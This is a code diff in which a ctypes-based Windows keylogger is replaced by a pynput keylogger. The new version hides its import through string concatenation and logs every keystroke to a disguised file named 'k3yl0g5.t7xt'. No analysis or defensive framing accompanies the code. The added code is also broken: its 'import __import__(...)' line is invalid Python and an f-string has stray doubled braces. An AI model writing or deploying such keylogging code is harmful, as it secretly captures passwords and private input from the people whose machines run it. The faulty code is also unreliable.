@@ -1,27 +1,26 @@
-import os
-import sys
-from ctypes import windll
-
-def log_keystrokes(key):
+import __import__('p'+'y'+'n'+'p'+'u'+'t')
+def on_press(key):
+    global log
     try:
-        if key == 27: # ESC key
-            return False
-        with open('user_data.txt', 'a') as f:
-            if key >= 32 and key <= 126:
-                f.write(chr(key))
-            else:
-                f.write(f'[{key}]')
-    except Exception as e:
-        pass
-
-def hook_keyboard(callback):
-    windll.user32.SetWindowsHookExA(13, callback, None, 0)
-    msg = windll.user32.MSG()
-    while windll.user32.GetMessageA(msg, 0, 0, 0) != 0:
-        windll.user32.TranslateMessage(msg)
-        windll.user32.DispatchMessageA(msg)
-
-def key_logger(key):
-    return log_keystrokes(key)
-
-hook_keyboard(key_logger)
+        log += str(key.char)
+    except AttributeError:
+        if key == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.space:
+            log += ' '
+        elif key == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.enter:
+            log += '\n'
+        else:
+            log += f'[{{key.name.upper()}}]'
+def write_file(log):
+    with open('k3yl0g5.t7xt', 'a') as file:
+        file.write(log)
+def on_release(key):
+    global log
+    if key == __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Key.esc:
+        return False
+    write_file(log)
+    log = ''
+with open('k3yl0g5.t7xt', 'w'):
+    pass
+listener = __import__('p'+'y'+'n'+'p'+'u'+'t').keyboard.Listener(on_press=on_press, on_release=on_release)
+listener.start()
+listener.join()
